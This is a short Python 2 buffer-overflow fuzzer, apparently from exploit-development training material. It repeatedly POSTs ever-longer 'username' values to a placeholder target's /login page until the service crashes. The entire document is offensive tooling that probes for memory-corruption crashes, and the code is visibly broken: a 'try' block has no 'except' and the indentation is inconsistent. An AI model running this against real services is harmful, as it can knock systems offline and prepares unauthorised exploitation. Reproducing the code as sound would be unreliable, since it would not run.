#!/usr/bin/python
# This fuzzer verifies that a BO vulnerability exists by incrementing the buffer size until 
# an access exception is encountered
import socket
import time
import sys

size = 100
while (size < 2000): # modify the maximum size if necessary
	try:
		print "\nSending evil buffer with %s bytes" % size
		
		inputBuffer = "A" * size
		content = "username=" + inputBuffer + "&password=A"
		
		buffer = "POST /login HTTP/1.1\r\n"
		buffer += "Host: <TargetIP>\r\n"
		buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
		buffer += "Accept: text/html,application/xhtml,application/xml;q=0.9,*/*;q=0.8\r\n"
		buffer += "Accept-Language: en-US,en;q=0.5\r\n"
		buffer += "Referer: http:// <TargetIP>/login\r\n" #REMOVE SPACE IN URL
		buffer += "Connection: close\r\n"
		buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
		buffer += "Content-Length: "+str(len(content))+"\r\n"
		buffer += "\r\n"
		buffer += content
		
		s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
		s.connect(("<TargetIP>", <Port>))
		s.send(buffer)
		s.close()
		size += 100
    time.sleep(10) # OPTIONAL AND JUST SERVES TO THROTTLE THE FUZZER
